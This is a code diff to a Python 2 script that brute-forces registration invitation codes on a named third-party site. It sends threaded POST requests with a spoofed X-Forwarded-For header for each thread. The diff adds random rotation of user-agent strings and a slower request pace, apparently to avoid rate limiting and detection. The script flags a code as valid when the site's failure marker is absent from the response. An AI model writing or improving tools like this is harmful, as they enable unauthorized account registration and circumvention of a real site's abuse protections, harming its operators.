@@ -1,3 +1,4 @@
+import random
 import urllib
 
 __author__ = 'xxp'
@@ -7,6 +8,15 @@ __author__ = 'xxp'
 import urllib2
 import time
 from threading import Thread
+
+user_agents = [
+    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0) ",
+    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.2) ",
+    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)",
+    "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 6.0)",
+    "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.2)",
+    "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.1)",
+]
 
 success_result = []
 
@@ -20,9 +30,10 @@ class GetUrlThread(Thread):
         value = {'reginvcode': self.code, "action": 'reginvcodeck'}
         value_encoded = urllib.urlencode(value)
         url = 'http://clsq.co/register.php'
-        user_agent = 'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)'
+        # user_agent = 'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)'
+        user_agent_ = user_agents[random.randint(0, len(user_agents) - 1)]
         headers = {
-            'User-Agent': user_agent,
+            'User-Agent': user_agent_,
             "X-Forwarded-for": self.ip
         }
 
@@ -42,7 +53,7 @@ class GetUrlThread(Thread):
             resp = urllib2.Request(url, data=value_encoded, headers=headers)
 
         resp_read = resp.read()
-        print(self.ip + " response: " + resp_read)
+        print(self.ip + " " + user_agent_ + " response: " + resp_read)
         if len(str(resp_read).strip()) > 0:
             success = str(resp_read).find("parent.retmsg_invcode('1');") < 0
         else:
@@ -63,7 +74,7 @@ def get_responses(code_list):
         t = GetUrlThread(code, default_ip + str(i))
         threads.append(t)
         t.start()
-        time.sleep(0.2)
+        time.sleep(0.5)
         i += 1
     for t in threads:
         t.join()
